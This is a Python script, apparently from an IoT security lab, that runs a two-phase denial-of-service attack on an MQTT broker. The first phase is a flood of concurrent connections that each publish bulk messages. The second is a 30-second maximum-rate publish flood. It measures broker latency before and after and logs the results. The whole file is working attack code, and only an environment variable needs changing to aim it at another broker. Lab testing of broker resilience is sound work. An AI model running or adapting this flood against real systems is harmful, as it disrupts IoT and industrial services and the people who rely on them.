#!/usr/bin/env python3
"""
03_dos.py - MQTT Broker Denial of Service Attack

Scenario 3: Flood attack against the MQTT broker to degrade or disrupt
the IoT infrastructure's availability.

Attack description:
    The attacker opens a large number of concurrent MQTT connections and
    floods the broker with a high volume of publish messages. Since the
    broker has no rate limiting or connection throttling, this causes
    increasing latency, dropped messages, and potential service disruption.

    Two attack phases are executed:
        1. Connection flood: spawn many concurrent clients simultaneously
        2. Publish flood: single client publishes at maximum rate

Expected result (insecure environment):
    - Broker response time increases significantly
    - Legitimate sensor messages are delayed or dropped
    - Service degradation visible on Grafana dashboard (gaps in data)

Metrics collected:
    - Messages published per second (throughput)
    - Broker response latency (ms)
    - Connection success rate
    - Time to service degradation

MITRE ATT&CK for ICS:
    - T0814: Denial of Service
    - T0816: Device Restart/Shutdown
"""

import paho.mqtt.client as mqtt
import threading
import time
import json
import os
import sys
from datetime import datetime


# ──────────────────────────────────────────────
# Attack configuration
# ──────────────────────────────────────────────
BROKER_HOST         = os.getenv("BROKER_HOST", "172.20.0.20")
BROKER_PORT         = int(os.getenv("BROKER_PORT", 1883))
FLOOD_CONNECTIONS   = int(os.getenv("FLOOD_CONNECTIONS", 50))   # concurrent connections
FLOOD_MESSAGES      = int(os.getenv("FLOOD_MESSAGES", 1000))    # messages per connection
FLOOD_TOPIC         = "attack/dos/flood"
OUTPUT_DIR          = "/attacker/results"

# ──────────────────────────────────────────────
# Shared metrics
# ──────────────────────────────────────────────
metrics = {
    "connections_success": 0,
    "connections_failed":  0,
    "messages_sent":       0,
    "messages_failed":     0,
    "latencies_ms":        [],
    "start_time":          None,
    "lock":                threading.Lock()
}


def log(msg: str):
    """Print a timestamped log message."""
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def measure_latency(host: str, port: int) -> float:
    """
    Measure broker response latency by timing a connect/publish/disconnect cycle.

    Args:
        host: Broker hostname or IP
        port: Broker port

    Returns:
        Round-trip latency in milliseconds, or -1 on failure
    """
    try:
        start = time.time()
        client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2,
            client_id=f"latency_probe_{threading.get_ident()}"
        )
        client.connect(host, port, keepalive=5)
        client.publish("attack/dos/probe", "ping", qos=0)
        client.disconnect()
        elapsed_ms = (time.time() - start) * 1000
        return round(elapsed_ms, 2)
    except Exception:
        return -1.0


def connection_flood_worker(worker_id: int):
    """
    Worker thread: opens a connection, floods messages, then disconnects.

    Args:
        worker_id: Unique identifier for this worker thread
    """
    try:
        client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2,
            client_id=f"attacker_dos_{worker_id}"
        )
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
        client.loop_start()

        with metrics["lock"]:
            metrics["connections_success"] += 1

        # Flood messages as fast as possible
        for i in range(FLOOD_MESSAGES):
            payload = json.dumps({
                "attacker": f"dos_worker_{worker_id}",
                "sequence": i,
                "timestamp": datetime.utcnow().isoformat()
            })
            result = client.publish(FLOOD_TOPIC, payload, qos=0)
            with metrics["lock"]:
                if result.rc == mqtt.MQTT_ERR_SUCCESS:
                    metrics["messages_sent"] += 1
                else:
                    metrics["messages_failed"] += 1

        client.loop_stop()
        client.disconnect()

    except Exception as e:
        with metrics["lock"]:
            metrics["connections_failed"] += 1


def run_connection_flood():
    """
    Phase 1: Launch multiple concurrent connections to flood the broker.
    """
    log(f"[*] Phase 1: Connection flood — spawning {FLOOD_CONNECTIONS} concurrent clients...")
    log(f"[*] Each client will publish {FLOOD_MESSAGES} messages")
    log("")

    threads = []
    for i in range(FLOOD_CONNECTIONS):
        t = threading.Thread(target=connection_flood_worker, args=(i,))
        threads.append(t)

    # Measure latency before attack
    latency_before = measure_latency(BROKER_HOST, BROKER_PORT)
    log(f"[*] Broker latency BEFORE attack: {latency_before}ms")

    # Launch all threads simultaneously
    launch_time = time.time()
    for t in threads:
        t.start()

    # Monitor progress
    while any(t.is_alive() for t in threads):
        with metrics["lock"]:
            sent = metrics["messages_sent"]
            conns = metrics["connections_success"]
        elapsed = round(time.time() - launch_time, 1)
        log(f"[~] Elapsed: {elapsed}s | Connections: {conns}/{FLOOD_CONNECTIONS} | Messages sent: {sent}")
        time.sleep(2)

    for t in threads:
        t.join()

    # Measure latency after attack
    latency_after = measure_latency(BROKER_HOST, BROKER_PORT)
    log(f"[*] Broker latency AFTER attack: {latency_after}ms")

    if latency_before > 0 and latency_after > 0:
        degradation = round(((latency_after - latency_before) / latency_before) * 100, 1)
        log(f"[!] Latency degradation: +{degradation}%")


def run_publish_flood():
    """
    Phase 2: Single client publishes at maximum possible rate for 30 seconds.
    Measures sustained throughput and broker response under continuous load.
    """
    log("")
    log("[*] Phase 2: Publish flood — maximum rate for 30 seconds...")

    try:
        client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2,
            client_id="attacker_publish_flood"
        )
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
        client.loop_start()

        flood_start = time.time()
        flood_count = 0
        duration = 30  # seconds

        while time.time() - flood_start < duration:
            payload = json.dumps({
                "attacker": "publish_flood",
                "sequence": flood_count,
                "timestamp": datetime.utcnow().isoformat()
            })
            client.publish(FLOOD_TOPIC, payload, qos=0)
            flood_count += 1

        elapsed = time.time() - flood_start
        throughput = round(flood_count / elapsed, 1)

        log(f"[+] Publish flood complete: {flood_count} messages in {round(elapsed, 1)}s")
        log(f"[+] Throughput: {throughput} messages/second")

        client.loop_stop()
        client.disconnect()

    except Exception as e:
        log(f"[-] Publish flood failed: {e}")


def save_results():
    """Save attack metrics to a log file."""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    filename = f"{OUTPUT_DIR}/03_dos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

    with open(filename, "w") as f:
        f.write("=== DoS Attack Results ===\n")
        f.write(f"Broker: {BROKER_HOST}:{BROKER_PORT}\n")
        f.write(f"Flood connections: {FLOOD_CONNECTIONS}\n")
        f.write(f"Messages per connection: {FLOOD_MESSAGES}\n")
        f.write(f"Connections success: {metrics['connections_success']}\n")
        f.write(f"Connections failed: {metrics['connections_failed']}\n")
        f.write(f"Messages sent: {metrics['messages_sent']}\n")
        f.write(f"Messages failed: {metrics['messages_failed']}\n")

    log(f"[*] Results saved to {filename}")
    return filename


def main():
    """Main attack orchestrator."""
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    print("==============================================")
    print(" SCENARIO 3 - MQTT Broker DoS Attack")
    print("==============================================")
    print(f" Target broker     : {BROKER_HOST}:{BROKER_PORT}")
    print(f" Flood connections : {FLOOD_CONNECTIONS}")
    print(f" Messages/conn     : {FLOOD_MESSAGES}")
    print("==============================================")
    print("")

    metrics["start_time"] = time.time()

    run_connection_flood()
    run_publish_flood()

    total_time = round(time.time() - metrics["start_time"], 1)
    output_file = save_results()

    print("")
    print("==============================================")
    print(" ATTACK SUMMARY - Scenario 3")
    print("==============================================")
    print(f" Total time        : {total_time}s")
    print(f" Connections ok    : {metrics['connections_success']}")
    print(f" Connections fail  : {metrics['connections_failed']}")
    print(f" Messages sent     : {metrics['messages_sent']}")
    print(f" Messages failed   : {metrics['messages_failed']}")
    print(f" Output saved to   : {output_file}")
    print("==============================================")


if __name__ == "__main__":
    main()